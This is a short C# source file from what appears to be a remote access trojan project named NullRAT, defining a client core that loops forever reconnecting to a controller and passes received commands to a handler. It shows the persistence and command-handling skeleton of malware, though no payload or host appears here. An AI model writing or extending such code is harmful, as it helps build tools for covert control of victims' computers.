using NullRAT.Features;
using System.Threading.Tasks;

namespace NullRAT.Core
{
    public static class ClientCore
    {
        public static void Start()
        {
            while (true)
            {
                try
                {
                    ConnectionManager.ConnectAndListen().Wait();
                }
                catch
                {
                    System.Threading.Thread.Sleep(Config.ReconnectDelay);
                }
            }
        }

        public static string ProcessCommand(string command)
        {
            return Commands.Handle(command);
        }
    }
}